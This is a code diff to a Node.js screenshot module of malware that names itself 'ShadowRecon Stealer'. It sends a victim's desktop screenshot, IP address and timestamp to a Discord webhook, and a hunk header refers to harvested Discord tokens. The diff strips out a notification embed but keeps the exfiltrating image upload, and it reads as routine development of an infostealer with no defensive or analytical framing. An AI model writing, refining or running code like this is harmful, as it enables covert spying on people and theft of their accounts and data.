@@ -719,52 +719,8 @@ This file indicates that the Discord module found tokens but couldn't process th
             const isPlaceholder = screenshotPath.includes('placeholder') || screenshotPath.endsWith('.txt');
             const fileType = isPlaceholder ? 'report' : 'screenshot';
 
-            // Create a simple embed for the screenshot
-            const embed = {
-                title: isPlaceholder ? "📄 Screenshot Report" : "🖥️ Desktop Screenshot",
-                color: isPlaceholder ? 0xff9900 : 0x2f3136,
-                description: isPlaceholder ? 
-                    "Screenshot capture report (display not available)" : 
-                    "Screenshot captured at application launch",
-                fields: [
-                    {
-                        name: ":earth_africa: IP Address",
-                        value: `\`${ip}\``,
-                        inline: true
-                    },
-                    {
-                        name: ":clock1: Timestamp",
-                        value: `\`${new Date().toISOString()}\``,
-                        inline: true
-                    },
-                    {
-                        name: ":gear: Status",
-                        value: isPlaceholder ? "`Headless Environment`" : "`Screenshot Captured`",
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: "ShadowRecon Stealer - Screenshot Module"
-                },
-                timestamp: new Date().toISOString()
-            };
-
-            // STEP 1: Send the embed first (without the image)
-            logger.info('Sending screenshot capture notification embed');
-            const embedPayload = {
-                content: null,
-                embeds: [embed],
-                attachments: []
-            };
-
-            const embedResponse = await this.sendWebhook(embedPayload);
-            if (!embedResponse) {
-                logger.warn('Failed to send screenshot embed, skipping image upload');
-                return false;
-            }
-
-            // STEP 2: Send the image file separately (without any content text)
-            logger.info('Sending screenshot image file');
+            // Send only the image file without any embed or content text
+            logger.info('Sending screenshot image file (no embed)');
             const FormData = require('form-data');
             const formData = new FormData();
 
@@ -780,7 +736,6 @@ This file indicates that the Discord module found tokens but couldn't process th
 
             logger.info(`Screenshot ${fileType} sent to webhook successfully`, { 
                 file: screenshotPath, 
-                embedStatus: embedResponse ? 'sent' : 'failed',
                 fileStatus: fileResponse.status,
                 type: fileType
             });
